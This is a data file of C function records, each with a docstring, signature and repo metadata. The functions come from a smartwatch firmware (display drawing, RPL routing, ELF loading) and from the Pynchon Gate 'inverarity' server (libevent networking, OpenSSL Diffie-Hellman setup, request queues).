{"docstring": "//*****************************************************************************\n//\n//! Fills a rectangle.\n//!\n//! \\param pvDisplayData is a pointer to the driver-specific data for this\n//! display driver.\n//! \\param pRect is a pointer to the structure describing the rectangle.\n//! \\param ulValue is the color of the rectangle.\n//!\n//! This function fills a rectangle on the display.  The coordinates of the\n//! rectangle are assumed to be within the extents of the display, and the\n//! rectangle specification is fully inclusive (in other words, both sXMin and\n//! sXMax are drawn, along with sYMin and sYMax).\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "static void\nTemplate_DriverRectFill(void *pvDisplayData, const tRectangle *pRect,\n                                  unsigned int ulValue)", "code": "{\n\n  int x0 = pRect->sXMin;\n  int x1 = pRect->sXMax;\n  int y0 = pRect->sYMin;\n  int y1 = pRect->sYMax;\n\n  while(y0 <= y1)\n  {\n    g_memlcd_Driver.pfnLineDrawH(pvDisplayData, x0, x1, y0, ulValue);\n    y0++;\n  }\n}", "path": "Watch\\platform\\common\\memlcd.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_remove_parent(rpl_dag_t *dag, rpl_parent_t *parent)", "code": "{\n  rpl_nullify_parent(dag, parent);\n\n  PRINTF(\"RPL: Removing parent \");\n  PRINT6ADDR(&parent->addr);\n  PRINTF(\"\\n\");\n\n  list_remove(dag->parents, parent);\n  memb_free(&parent_memb, parent);\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "int\nrpl_set_prefix(rpl_dag_t *dag, uip_ipaddr_t *prefix, unsigned len)", "code": "{\n  if(len > 128) {\n    return 0;\n  }\n\n  memset(&dag->prefix_info.prefix, 0, sizeof(dag->prefix_info.prefix));\n  memcpy(&dag->prefix_info.prefix, prefix, (len + 7) / 8);\n  dag->prefix_info.length = len;\n  dag->prefix_info.flags = UIP_ND6_RA_FLAG_AUTONOMOUS;\n  PRINTF(\"RPL: Prefix set - will announce this in DIOs\\n\");\n  /* Autoconfigure an address if this node does not already have an address\n     with this prefix. */\n  check_prefix(NULL, &dag->prefix_info);\n  return 1;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "static int\nshould_send_dao(rpl_instance_t *instance, rpl_dio_t *dio, rpl_parent_t *p)", "code": "{\n  /* if MOP is set to no downward routes no DAO should be sent */\n  if(instance->mop == RPL_MOP_NO_DOWNWARD_ROUTES) {\n    return 0;\n  }\n  /* check if the new DTSN is more recent */\n  return p == instance->current_dag->preferred_parent &&\n    (lollipop_greater_than(dio->dtsn, p->dtsn));\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/*---------------------------------------------------------------------------*/\n/*\nstatic void\nseek_write(int fd, unsigned int offset, char *buf, int len)\n{\n  cfs_seek(fd, offset, CFS_SEEK_SET);\n  cfs_write(fd, buf, len);\n}\n*/\n/*---------------------------------------------------------------------------*/\n", "func_signal": "static void *\nfind_local_symbol(int fd, const char *symbol,\n\t\t  unsigned int symtab, unsigned short symtabsize,\n\t\t  unsigned int strtab)", "code": "{\n  struct elf32_sym s;\n  unsigned int a;\n  char name[30];\n  struct relevant_section *sect;\n  \n  for(a = symtab; a < symtab + symtabsize; a += sizeof(s)) {\n    seek_read(fd, a, (char *)&s, sizeof(s));\n\n    if(s.st_name != 0) {\n      seek_read(fd, strtab + s.st_name, name, sizeof(name));\n      if(strcmp(name, symbol) == 0) {\n\tif(s.st_shndx == bss.number) {\n\t  sect = &bss;\n\t} else if(s.st_shndx == data.number) {\n\t  sect = &data;\n\t} else if(s.st_shndx == text.number) {\n\t  sect = &text;\n\t} else {\n\t  return NULL;\n\t}\n\treturn &(sect->address[s.st_value]);\n      }\n    }\n  }\n  return NULL;\n}", "path": "Watch\\core\\loader\\elfloader.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "//*****************************************************************************\n//\n//! Draws a horizontal line.\n//!\n//! \\param pvDisplayData is a pointer to the driver-specific data for this\n//! display driver.\n//! \\param lX1 is the X coordinate of the start of the line.\n//! \\param lX2 is the X coordinate of the end of the line.\n//! \\param lY is the Y coordinate of the line.\n//! \\param ulValue is the color of the line.\n//!\n//! This function draws a horizontal line on the display.  The coordinates of\n//! the line are assumed to be within the extents of the display.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "static void\nTemplate_DriverLineDrawH(void *pvDisplayData, int lX1, int lX2,\n                                   int lY, unsigned int ulValue)", "code": "{\n  uint8_t *pucData = lines[lY].pixels;\n  uint8_t lMask;\n\n  if (ulValue) ulValue = 0xffff; // 16 bit value\n\n  pucData += lX1 / 8;\n\n  // see if current buffer byte need retain\n  if (lX1 & 7)\n  {\n    lMask = 8 - (lX1 & 7);\n    if (lMask > (lX2 - lX1 + 1))\n    {\n      lMask = lX2 - lX1 + 1;\n    }\n    lMask = ((1 << lMask) - 1) << ((lX1 & 7));\n\n    // draw the pixel\n    *pucData = (*pucData & ~lMask) | (ulValue & lMask);\n    pucData++;\n    lX1 = (lX1 + 7) & ~7;\n  }\n\n if (((uint8_t)pucData & 1) && ((lX2 - lX1) > 8))\n {\n   *pucData++ = ulValue & 0xff;\n   lX1 += 8;\n }\n\n while((lX1 + 15) <= lX2)\n {\n   *(uint16_t *)pucData = ulValue;\n   pucData += 2;\n   lX1 += 16;\n }\n\n while((lX1 + 7) <= lX2)\n {\n   *pucData = ulValue & 0xff;\n   pucData ++;\n   lX1 += 8;\n }\n\n if (lX1 <= lX2)\n {\n   lMask = 0xff >> (7 - (lX2 - lX1));\n   *pucData = (*pucData & ~lMask) | (ulValue & lMask);\n }\n\n halLcdRefresh(lY, lY);\n}", "path": "Watch\\platform\\common\\memlcd.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "rpl_dag_t *\nrpl_alloc_dag(uint8_t instance_id, uip_ipaddr_t *dag_id)", "code": "{\n  rpl_dag_t *dag, *end;\n  rpl_instance_t *instance;\n\n  instance = rpl_get_instance(instance_id);\n  if(instance == NULL) {\n    instance = rpl_alloc_instance(instance_id);\n    if(instance == NULL) {\n      RPL_STAT(rpl_stats.mem_overflows++);\n      return NULL;\n    }\n  }\n\n  for(dag = &instance->dag_table[0], end = dag + RPL_MAX_DAG_PER_INSTANCE; dag < end; ++dag) {\n    if(!dag->used) {\n      memset(dag, 0, sizeof(*dag));\n      LIST_STRUCT_INIT(dag, parents);\n      dag->used = 1;\n      dag->rank = INFINITE_RANK;\n      dag->min_rank = INFINITE_RANK;\n      dag->instance = instance;\n      return dag;\n    }\n  }\n\n  RPL_STAT(rpl_stats.mem_overflows++);\n  rpl_free_instance(instance);\n  return NULL;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_free_dag(rpl_dag_t *dag)", "code": "{\n  if(dag->joined) {\n    PRINTF(\"RPL: Leaving the DAG \");\n    PRINT6ADDR(&dag->dag_id);\n    PRINTF(\"\\n\");\n    dag->joined = 0;\n\n    /* Remove routes installed by DAOs. */\n    rpl_remove_routes(dag);\n\n   /* Remove autoconfigured address */\n    if((dag->prefix_info.flags & UIP_ND6_RA_FLAG_AUTONOMOUS)) {\n      check_prefix(&dag->prefix_info, NULL);\n    }\n\n    remove_parents(dag, 0);\n  }\n  dag->used = 0;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "void\nprint_stats(void)", "code": "{\n#if 0\n  PRINTA(\"S %d.%d clock %lu tx %lu rx %lu rtx %lu rrx %lu rexmit %lu acktx %lu noacktx %lu ackrx %lu timedout %lu badackrx %lu toolong %lu tooshort %lu badsynch %lu badcrc %lu contentiondrop %lu sendingdrop %lu lltx %lu llrx %lu\\n\",\n\t rimeaddr_node_addr.u8[0], rimeaddr_node_addr.u8[1],\n\t clock_seconds(),\n\t rimestats.tx, rimestats.rx,\n\t rimestats.reliabletx, rimestats.reliablerx,\n\t rimestats.rexmit, rimestats.acktx, rimestats.noacktx,\n\t rimestats.ackrx, rimestats.timedout, rimestats.badackrx,\n\t rimestats.toolong, rimestats.tooshort,\n\t rimestats.badsynch, rimestats.badcrc,\n\t rimestats.contentiondrop, rimestats.sendingdrop,\n\t rimestats.lltx, rimestats.llrx);\n#endif\n#if ENERGEST_CONF_ON\n  PRINTA(\"E %d.%d clock %lu cpu %lu lpm %lu irq %lu serial %lu\\n\",\n\t rimeaddr_node_addr.u8[0], rimeaddr_node_addr.u8[1],\n\t clock_seconds(),\n\t energest_total_time[ENERGEST_TYPE_CPU].current,\n\t energest_total_time[ENERGEST_TYPE_LPM].current,\n\t energest_total_time[ENERGEST_TYPE_IRQ].current,\n\t energest_total_time[ENERGEST_TYPE_SERIAL].current);\n#endif /* ENERGEST_CONF_ON */\n}", "path": "Watch\\core\\lib\\print-stats.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_free_instance(rpl_instance_t *instance)", "code": "{\n  rpl_dag_t *dag;\n  rpl_dag_t *end;\n\n  PRINTF(\"RPL: Leaving the instance %u\\n\", instance->instance_id);\n\n  /* Remove any DAG inside this instance */\n  for(dag = &instance->dag_table[0], end = dag + RPL_MAX_DAG_PER_INSTANCE; dag < end; ++dag) {\n    if(dag->used) {\n      rpl_free_dag(dag);\n    }\n  }\n\n  rpl_set_default_route(instance, NULL);\n\n  ctimer_stop(&instance->dio_timer);\n  ctimer_stop(&instance->dao_timer);\n\n  if(default_instance == instance) {\n    default_instance = NULL;\n  }\n\n  instance->used = 0;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "static void\nnullify_parents(rpl_dag_t *dag, rpl_rank_t minimum_rank)", "code": "{\n  rpl_parent_t *p, *p2;\n\n  PRINTF(\"RPL: Removing parents (minimum rank %u)\\n\",\n\tminimum_rank);\n\n  for(p = list_head(dag->parents); p != NULL; p = p2) {\n    p2 = p->next;\n    if(p->rank >= minimum_rank) {\n      rpl_nullify_parent(dag, p);\n    }\n  }\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "rpl_parent_t *\nrpl_select_parent(rpl_dag_t *dag)", "code": "{\n  rpl_parent_t *p, *best;\n\n  best = NULL;\n  for(p = list_head(dag->parents); p != NULL; p = p->next) {\n    if(p->rank == INFINITE_RANK) {\n      /* ignore this neighbor */\n    } else if(best == NULL) {\n      best = p;\n    } else {\n      best = dag->instance->of->best_parent(best, p);\n    }\n  }\n\n  if(best != NULL) {\n    dag->preferred_parent = best;\n  }\n\n  return best;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/**\n * Libevent callback: invoked when we get a SIGHUP.  Reloads the disrtributions.\n */\n", "func_signal": "static void\nhandle_sighup_cb(evutil_socket_t signum, short what, void *arg)", "code": "{\n        assert(signum == SIGHUP);\n        const char *workdir = arg;\n        load_distributed_files(workdir);\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Load files for all the distributions in the appropriate directory in our workdir, and launch\n * or stop workers as appropriate.  (We start a worker for each file not previously distributed,\n * and stop all workers that were distributing files we don't have any more.)\n *\n * Return the number of currently configured distributions.\n */\n", "func_signal": "int\nload_distributed_files(const char *workdir)", "code": "{\n        char *directory = printf_dup(\"%s/dist\", workdir);\n        if (!directory)\n                return -1;\n        DIR *d = opendir(directory);\n\n        log_note(\"Reading files in %s...\", directory);\n        free(directory);\n\n        /* We use a mark-and-sweep approach to kill obsolete workers.  We start by marking\n           everybody.  If we find a distribution file that you're serving, then we remove your\n           mark.  At the end of the look, every worker that still has a mark is obsolete. */\n        mark_all_workers();\n\n        struct dirent *de;\n        int n_ok = 0;\n\n        struct distinfo *dists = NULL;\n        size_t summary_bytes = 0;\n\n        while ((de = readdir(d))) { /*XXXX not a threadsafe API*/\n                if (de->d_name[0] == '.')\n                        continue; /* Skip hidden files */\n                if (!strcmpend(de->d_name, \".meta\"))\n                        continue; /* Read metafiles later. */\n\n                char *path = printf_dup(\"%s/dist/%s\", workdir, de->d_name);\n                log_note(\"Reading %s... \", de->d_name);\n\n                struct stat st;\n                if (stat(path, &st)) {\n                        log_error(\"couldn't stat\");\n                        free(path);\n                        continue;\n                }\n\n                int should_replace=0;\n                struct worker *old_worker = worker_get_by_filename(path, &st, &should_replace);\n                if (old_worker && !should_replace) {\n                        free(path);\n                        unmark_worker(old_worker);\n                        ++n_ok;\n                        continue;\n                }\n\n                struct distribution *dist = load_distribution(path);\n                free(path);\n                if (!dist) {\n                        log_error(\"couldn't load\");\n                        continue;\n                }\n\n                char *hex = hexdup(distribution_get_identity(dist), 32);\n                log_note(\"Distribution identity is %s\", hex);\n                free(hex);\n\n                struct worker *w = new_worker(dist);\n                if (!w) {\n                        log_error(\"couldn't make worker\");\n                        free_distribution(dist);\n                        continue;\n                }\n                if (start_worker(w) < 0) {\n                        log_error(\"Couldn't start worker\");\n                        free_worker(w);\n                        continue;\n                }\n                add_worker(w);\n                puts(\"looks okay.\");\n                ++n_ok;\n\n                struct distinfo *di = malloc(sizeof(*di));\n                if (!di) {\n                        log_error(\"Couldn't alloc distinfo\");\n                        continue;\n                }\n                memcpy(di->id, distribution_get_identity(dist), 32);\n                memcpy(di->distributor, distribution_get_distributor_id(dist), 32);\n                memcpy(di->fname, distribution_get_distributor_fname(dist), 32*2);\n                summary_bytes += 128;\n                di->next = dists;\n                dists = di;\n        }\n        closedir(d);\n\n        sweep_marked_workers();\n\n        size_t sz = n_ok * 128 + 4;\n        uint8_t *dist_list = malloc(sz);\n        uint8_t *cp = dist_list;\n        set_uint32(cp, n_ok);\n        cp += 4;\n        while (dists) {\n                memcpy(cp, dists->distributor, 32); cp += 32;\n                memcpy(cp, dists->fname, 64); cp += 64;\n                memcpy(cp, dists->id, 32); cp += 32;\n\n                struct distinfo *victim = dists;\n                dists = dists->next;\n                free(victim);\n        }\n        assert(cp == dist_list + sz);\n\n        if (the_dist_list)\n                free(the_dist_list);\n        the_dist_list = dist_list;\n        the_dist_list_size = sz;\n\n        return n_ok;\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Bufferevent callback: invoked whenever we have read some data on a connection.\n */\n", "func_signal": "static void\nreadcb(struct bufferevent *bev, void *conn_)", "code": "{\n        struct conn *conn = conn_;\n        struct evbuffer *input = bufferevent_get_input(bev);\n\n        while (1) { /* Loop to handle as many requests as possible. */\n\n                /* If the command header isn't here yet, give up and wait for more data. */\n                if (evbuffer_get_length(input) < 44)\n                        return;\n\n                /* Parse the command header */\n                uint8_t cmdheader_buf[44];\n                evbuffer_copyout(input, cmdheader_buf, 44); /* nondestructive copy */\n                const uint8_t * const req_id = cmdheader_buf;\n                uint32_t cmd = get_uint32(cmdheader_buf+32);\n                uint32_t len = get_uint32(cmdheader_buf+36);\n                uint32_t flags = get_uint32(cmdheader_buf+40);\n                if (len > max_client_cmdlen) {\n                        send_err(conn, 1, req_id, \"Command too long\", 1);\n                        return;\n                }\n\n                /* Wait for the whole command to arrive */\n                if (evbuffer_get_length(input) < 44 + len)\n                        return;  /* XXXX set a watermark */\n                /* XXXX clear that watermark. */\n\n                /* Discard the command header */\n                evbuffer_drain(input, 44);\n\n                /* We only know how to handle GET right now. */\n                switch (cmd) {\n                case 0x1000:\n                        if (handle_get_command(conn, req_id, flags, input, len))\n                                return;\n                        break;\n                case 0x1001:\n                        if (handle_get_metadata_command(conn, req_id, flags, input, len))\n                                return;\n                        break;\n                case 0x1002:\n                        if (handle_list_dists_command(conn, req_id, flags, input, len))\n                                return;\n                        break;\n                default:\n                        evbuffer_drain(input, len);\n                        send_err(conn, 2, req_id, \"Unknown command\", 0);\n                        continue;\n                }\n\n        }\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Try to parse and handle a get_metadata request from input, removing it from the buffer.\n *\n * Return true if we should stop handling commands after this.\n */\n", "func_signal": "static int\nhandle_get_metadata_command(struct conn *conn, const uint8_t *req_id, uint32_t flags, struct evbuffer *input, uint32_t cmd_len)", "code": "{\n        /* okay, the command is a GET.  Is its header long enough? */\n        if (cmd_len < 32) {\n                send_err(conn, 2, req_id, \"GET_METADATA too short\", 1);\n                return 1;\n        }\n\n        /* Read afternd parse the get header. */\n        uint8_t getmeta_header[32];\n        evbuffer_remove(input, getmeta_header, 32);\n        const uint8_t *const dist_id = getmeta_header;\n        evbuffer_drain(input, cmd_len - 32);\n\n        struct worker *w = find_worker(dist_id);\n        if (!w) {\n                send_err(conn, 6, req_id, \"No such distribution\", 0);\n                return 0;\n        }\n        const struct distribution *dist = worker_get_distribution(w);\n        const uint8_t *metadata;\n        size_t metadata_len;\n        if (distribution_get_metadata(dist, &metadata, &metadata_len)<0) {\n                send_err(conn, 9, req_id, \"Distribution had no metadata\", 0);\n                return 0;\n        }\n\n        /* Send the reply. */\n        /* XXXX maybe use evbuffer_add_reference for this later */\n        send_data(conn, req_id, 0x2003, metadata_len, metadata);\n\n        return 0;\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Helper: launch a request for a distribution with 'identity'.  The request ID is 'req_id', the\n * connection is 'conn', and the body of the request is 'bitmask', which contains 'n_bits' bits.\n * The client expects the answer to be 'blocksize' in length.\n *\n * If we can't launch the request, send an error message, and free bitmask.\n */\n", "func_signal": "static void\nstart_request(const uint8_t *identity,\n              const uint8_t *req_id,\n              struct conn *conn,\n              size_t n_bits,\n              size_t blocksize,\n              uint8_t *bitmask)", "code": "{\n        struct worker *w = find_worker(identity);\n\n        struct request *r = calloc(sizeof(*r), 1);\n        if (!r) {\n                send_err(conn, 5, req_id, \"Internal error\", 1);\n                free(bitmask);\n                return;\n        }\n        if (!w) {\n                send_err(conn, 6, req_id, \"No such distribution\", 0);\n                free(bitmask);\n                return;\n        }\n\n        /* XXXX A lot of this should probably move into a new function in request.c */\n\n        const struct distribution *dist = worker_get_distribution(w);\n        if (blocksize == 0)\n                blocksize = distribution_get_blocksize(dist);\n        if (distribution_get_blocksize(dist) != blocksize) {\n                send_err(conn, 6, req_id, \"Wrong block size\", 0);\n                free(bitmask);\n                return;\n        }\n        if (n_bits < distribution_get_n_blocks(dist)) {\n                send_err(conn, 7, req_id, \"Not enough bits\", 0);\n                free(bitmask);\n                return;\n        }\n\n        memcpy(r->identity, identity, 32);\n        memcpy(r->req_id, req_id, 32);\n        r->conn = conn;\n        r->n_bits = n_bits;\n        r->blocksize = blocksize;\n        r->bitmask = bitmask;\n        r->result = calloc(1, r->blocksize); /*XXXX check return value */\n\n        if (queue_request_for_worker(w, r) < 0) {\n                request_free(r);\n                send_err(conn, 8, req_id, \"Worker didn't accept request\", 0);\n        } else {\n                ++conn->pending_requests;\n        }\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Libevent callback: invoked in the main thread after a worker thread adds to the response queue.\n *\n * This callback is responsible for queueing all the pending requests onto the user connections.\n **/\n", "func_signal": "static void\nresponse_queue_cb(evutil_socket_t sock_, short events_, void *arg)", "code": "{\n        struct response_queue *queue = arg;\n        while (1) {\n                pthread_mutex_lock(&queue->lock);\n                if (queue->requests->n_requests == 0) {\n                        pthread_mutex_unlock(&queue->lock);\n                        return;\n                }\n\n                struct request_array *ra = queue->requests;\n                queue->requests = request_array_new();\n                pthread_mutex_unlock(&queue->lock);\n\n\n                int i;\n                for (i = 0; i < ra->n_requests; ++i)\n                        request_send_reply(ra->reqs[i]);\n\n                request_array_free(ra);\n        }\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Callback for openssl diffie hellman parameter generation.  Prints little characters to amuse the\n * user while their CPU searches for a safe prime.\n */\n", "func_signal": "static void\ndh_verbose_cb(int p, int n, void *arg)", "code": "{\n        switch (p) {\n        case 0:\n                fputs(\".\", stderr);\n                break;\n        case 1:\n                fputs(\"+\", stderr);\n                break;\n        case 2:\n                fputs(\"*\", stderr);\n                break;\n        case 3:\n                fputs(\"\\n\", stderr);\n                break;\n        }\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Read Diffie-Hellman parameters from the appropriate file in workdir into an SSL context.\n *\n * Return 0 on success, -1 on failure.\n */\n", "func_signal": "int\nload_dh(const char *workdir, SSL_CTX *ctx)", "code": "{\n        char *path = printf_dup(\"%s/keys/dh_params\", workdir);\n\n        BIO *f = BIO_new_file(path, \"r\");\n        if (!f)\n                goto err;\n        DH *dh = PEM_read_bio_DHparams(f,NULL,NULL,NULL);\n        if (!dh)\n                goto err;\n        int codes;\n        if (DH_check(dh, &codes) == 0 || codes) {\n                log_error(\"Loaded DH parameters look bad!\");\n                goto err;\n        }\n\n        SSL_CTX_set_tmp_dh(ctx, dh);\n        DH_free(dh);\n        BIO_free(f);\n        free(path);\n        return 0;\nerr:\n        if (f)\n                BIO_free(f);\n        if (path)\n                free(path);\n        return -1;\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Explain how to invoke the program.\n */\n", "func_signal": "static void\nsyntax(void)", "code": "{\n        puts(\"Syntax:\");\n        puts(\"  inverarity <work_dir> [address] [port]\");\n        puts(\"Address defaults to localhost; port defaults to 49494\");\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * OpenSSL callback to ask for a password for reading your private key; see documenation for\n * OpenSSL's SSL_CTX_set_default_passwd_cb for more information on the interface.\n */\n", "func_signal": "static int\npem_passwd_cb(char *buf, int size, int rwflag, void *userdata)", "code": "{\n        assert(rwflag == 0); /* Only reading is supported */\n        return my_getpass(\"Password for private key: \", buf, size);\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Bufferevent callback: close the bufferevent if it is done flushing.\n */\n", "func_signal": "static void\ncloseonflush_writecb(struct bufferevent *bev, void *arg)", "code": "{\n        if (evbuffer_get_length(bufferevent_get_output(bev)) == 0)\n                bufferevent_free(bev);\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Helper: send the answer for a request back to the user, then free it.\n */\n", "func_signal": "static void\nrequest_send_reply(struct request *req)", "code": "{\n        struct conn *conn = req->conn;\n\n        --conn->pending_requests;\n\n        if (conn->bev == NULL) {\n                request_free(req);\n                if (conn->pending_requests == 0)\n                        free_conn(req->conn);\n\n                return;\n        }\n\n        send_data(conn, req->req_id, 0x2001, req->blocksize, req->result);\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Generate a new set of Diffie-Hellman parameters of length 'bits', write them to the appropriate\n * file in workdir, and set them in the SSL context.\n *\n * We _do_ want to generate our own parameters rather than using, say, any of the well-known IPSEC\n * primes here: using nearly any well-known prime in TLS can make a protocol more blockable than it\n * would otherwise be, if nobody else is using it... and basically nobody is using the RFC2409\n * primes _in TLS_.\n */\n", "func_signal": "int\ngenerate_dh(const char *workdir, SSL_CTX *ctx, int bits)", "code": "{\n        log_note(\"Generating DH parameters. (This could take a while.)\");\n        DH *dh = DH_generate_parameters(bits, 2, dh_verbose_cb, NULL);\n\n        if (!dh) {\n                log_error(\"Couldn't make DH parameters.\");\n                return -1;\n        }\n        char *path = printf_dup(\"%s/keys/dh_params\", workdir);\n        BIO *bio = BIO_new_file(path, \"w\");\n        free(path);\n        if (!bio) {\n                log_error(\"Couldn't open dh_params for writing\");\n                DH_free(dh);\n                return -1;\n        }\n        if (!PEM_write_bio_DHparams(bio, dh)) {\n                DH_free(dh);\n                BIO_free(bio);\n                return -1;\n        }\n        BIO_free(bio);\n\n        SSL_CTX_set_tmp_dh(ctx, dh);\n        DH_free(dh);\n        return 0;\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Bufferevent callback: invoked when we have some event happen on a connection\n */\n", "func_signal": "static void\neventcb(struct bufferevent *bev, short what, void *conn_)", "code": "{\n        struct conn *conn = conn_;\n        if (what & (BEV_EVENT_ERROR|BEV_EVENT_EOF)) {\n                bufferevent_free(bev);\n                if (conn)\n                        conn->bev = NULL;\n                if (conn && conn->pending_requests == 0)\n                        free_conn(conn);\n        }\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Libevent callback: invoked when we get a new connection.\n */\n", "func_signal": "static void\nlistener_cb(struct evconnlistener *listener,\n            evutil_socket_t fd,\n            struct sockaddr *sa,\n            int socklen,\n            void *arg)", "code": "{\n        SSL_CTX *ctx = arg;\n        struct event_base *base = evconnlistener_get_base(listener);\n\n        new_connection(base, ctx, fd, sa, socklen);\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Add an entry to a response queue.\n */\n", "func_signal": "void\nresponse_queue_enqueue(struct response_queue *queue, struct request *req)", "code": "{\n        int n;\n        pthread_mutex_lock(&queue->lock);\n        n = request_array_add(queue->requests, req);\n        if (n == 1)\n                event_active(queue->ev_notify, EV_READ, 1);\n        pthread_mutex_unlock(&queue->lock);\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Used to initialize a response queue to send replies on an event_base.\n */\n", "func_signal": "struct response_queue *\nresponse_queue_new(struct event_base *base)", "code": "{\n        struct response_queue *rq;\n        if (!(rq = calloc(sizeof(*rq), 1))) {\n                log_perror(\"calloc\");\n                return NULL;\n        }\n        if (!(rq->requests = request_array_new())) {\n                log_error(\"request_array_new failed\");\n                free(rq);\n                return NULL;\n        }\n        if (!(rq->ev_notify = event_new(base, -1, 0, response_queue_cb, rq))) {\n                log_error(\"event_new failed\");\n                request_array_free(rq->requests);\n                free(rq);\n                return NULL;\n        }\n        if (pthread_mutex_init(&rq->lock, NULL)) {\n                log_error(\"pthread_mutex_init failed\");\n                event_free(rq->ev_notify);\n                request_array_free(rq->requests);\n                free(rq);\n                return NULL;\n        }\n\n        return rq;\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Try to parse and handle a list_dists request from input, removing it from the buffer.\n *\n * Return true if we should stop handling commands after this.\n */\n", "func_signal": "static int\nhandle_list_dists_command(struct conn *conn, const uint8_t *req_id, uint32_t flags, struct evbuffer *input, uint32_t cmd_len)", "code": "{\n        evbuffer_drain(input, cmd_len); /* Ignore the command body. */\n\n        const uint8_t *dl;\n        size_t sz;\n        if (get_distribution_list(&dl,&sz)< 0) {\n                send_err(conn, 10, req_id, \"No distribution list present\", 0);\n                return 0;\n        }\n        send_data(conn, req_id, 0x2004, sz, dl);\n\n        return 0;\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
